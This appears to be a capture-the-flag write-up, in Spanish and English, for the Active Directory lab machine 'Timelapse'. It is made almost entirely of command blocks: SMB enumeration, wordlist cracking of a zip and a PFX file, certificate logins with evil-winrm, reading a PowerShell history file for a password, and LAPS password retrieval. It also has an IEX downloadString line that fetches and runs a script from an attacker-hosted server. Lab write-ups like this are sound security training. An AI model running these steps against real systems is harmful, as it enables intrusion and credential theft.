---
# multilingual page pair id, this must pair with translations of this page. (This name must be unique)
lng_pair: id_timelapse
title: "Timelapse"

# post specific
# if not specified, .name will be used from _data/owner/[language].yml
author: Bast1ant1c
# multiple category is not supported
category: Easy
# multiple tag entries are possible
tags: [AD, pentesting]
# thumbnail image for post
img: ":main_photo.jpg"
# disable comments on this page
#comments_disable: true

# publish date
date: 2022-12-27

# seo
# if not specified, date will be used.
#meta_modify_date: 2022-01-01 10:04:30 +0900
# check the meta_common_description in _data/owner/[language].yml
meta_description: ""

# optional
# please use the "image_viewer_on" below to enable image viewer for individual pages or posts (_posts/ or [language]/_posts folders).
# image viewer can be enabled or disabled for all posts using the "image_viewer_posts: true" setting in _data/conf/main.yml.
#image_viewer_on: true
# please use the "image_lazy_loader_on" below to enable image lazy loader for individual pages or posts (_posts/ or [language]/_posts folders).
# image lazy loader can be enabled or disabled for all posts using the "image_lazy_loader_posts: true" setting in _data/conf/main.yml.
#image_lazy_loader_on: true
# exclude from on site search
#on_site_search_exclude: true
# exclude from search engines
#search_engine_exclude: true
# to disable this page, simply set published: false or delete this file
#published: false
---
<!-- outline-start -->

Hola, esta es la máquina timelapse! Let's hack!

<!-- outline-end -->

## RECON
```bash
ping -c 1 <IP>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG ports
extractports <ports>
nmap -sCV <PORTS> -oG services
```

## AD DOMAIN DETECTION
```bash
crackmapexec smb <IP>
sudo su
nvim /etc/hosts
<IP>	<DOMAIN>
```

## SMB ENUM
```bash
smbclient -L <IP> -N
crackmapexec smb <IP> --shares
smbmap -H <IP> -u 'null'
```

## SMB ENUM MACHINE
```bash
smbclient //<IP>/Shares -N
cd Dev
get <Archivo.zip>
```

## DECRYPT FILE PASSWORD
```bash
unzip <Archivo.zip>
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <Archivo.zip>
unzip <Archivo.zip>
```

## TRYING TO OPEN PFX FILE
```bash
openssl pkcs12 -in <Archivo.pfx> -nocerts -out priv-key.pem -nodes
```

## FINDING PFX FILE PASSWORD (PFX2JOHN)
```bash
python3 pfx2john.py <Archivo.pfx>
```

## FINDING PFX FILE PASSWORD (CRACKPKCS12)
```bash
apt install libssl-dev
git clone https://github.com/crackpkcs12/crackpkcs12
cd crackpkcs12
./configure
make
make install
crackpkcs12 -d /usr/share/wordlists/rockyou.txt <Archivo.pfx>
```

## OPENING PFX FILE
```bash
openssl pkcs12 -in <Archivo.pfx> -nocerts -out priv-key.pem -nodes
ls
openssl pkcs12 -in <Archivo.pfx> -nokeys -out certificate.pem
cat certificate.pem
```

## GRANTED ACCESS LEGACYY USER
```bash
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
whoami
```

## FLAG USER.TXT
```bash
cd ..
cd Desktop
cat user.txt
```

## AD ENUM LOCAL
```bash
net user
whoami /priv
net user legacyy
net user svc_deploy
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## GRANTED ACCESS SVC_DEPLOY USER
```bash
crackmapexec smb <IP> -u 'svc_deploy' -p '<PASSWORD>'
evil-winrm -i <IP> -u 'svc_deploy' -p '<PASSWORD>' -S
whoami
```

## SHARING GET-LAPSPASSWORDS.PS1
```bash
# MÁQUINA ATACANTE
git clone https://github.com/kfosaaen/Get-LAPSPasswords
cd Get-LAPSPasswords
python3 -m http.server 80

# MÁQUINA VÍCTIMA
IEX(New.Object Net.WebClient).downloadString('http://<IP_ATACANTE>/Get-LAPSPasswords.ps1')
Get-LAPSPasswords
```

## GRANTED ACCESS ADMINISTRATOR USER
```bash
crackmapexec smb <IP> -u 'Administrator' -p '<PASSWORD>'
evil-winrm -i <IP> -u 'Administrator' -p '<PASSWORD>' -S
whoami
```

## FLAG ROOT.TXT
```bash
type C:\users\TRX\Desktop\root.txt
```
